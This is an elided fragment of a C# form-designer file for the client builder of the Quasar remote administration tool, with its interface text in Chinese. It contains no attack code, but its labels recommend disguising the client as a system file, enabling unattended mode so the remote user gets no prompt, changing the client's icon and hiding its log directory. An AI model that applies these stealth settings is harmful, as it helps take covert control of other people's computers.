...
namespace Quasar.Server.Forms
{
    partial class FrmBuilder
    {
        ...
        private void InitializeComponent()
        {
            ...
            this.tooltip.SetToolTip(this.picUAC2, "安装客户端到系统需要管理员权限.");
            // 
            // picUAC1
            // 
            ...
            this.tooltip.SetToolTip(this.picUAC1, "需要管理员权限才能在程序文件夹中安装客户端.");
            // 
            // rbSystem
            // 
            ...
            this.rbSystem.Text = "(建议勾选)伪装系统文件";
            this.tooltip.SetToolTip(this.rbSystem, "安装客户端到系统需要管理员权限.");
            ...
            this.tooltip.SetToolTip(this.rbProgramFiles, "安装客户端到程序文件夹需要管理员权限.");
            ...
            this.clearToolStripMenuItem.Text = "删除全部";
            ...
            this.label3.Text = "启用无人值守模式可以实现远程控制客户端\r\n无需用户介入(不启用时连接到客户端，客户端会有弹窗提示，建议开启)" +
    ".";
            // 
            // chkUnattendedMode
            // 
            ...
            this.chkUnattendedMode.Text = "启用无人值守模式(建议勾选，不勾选连接时客户端将收到提示)";
    ...
    "只有一个客户端实例在运行.";
            ...
            this.label7.Text = "你可以选择一个独特的标签来标识你的客户.";
            // 
            // lblTag
            // 
            ...
            this.lblRegistryKeyName.Text = "名称:";
            // 
            // chkStartup
            // 
            ...
            this.chkChangeIcon.Text = "更改组件图标";
            ...
            this.chkHideLogDirectory.Text = "设置目录属性为隐藏";
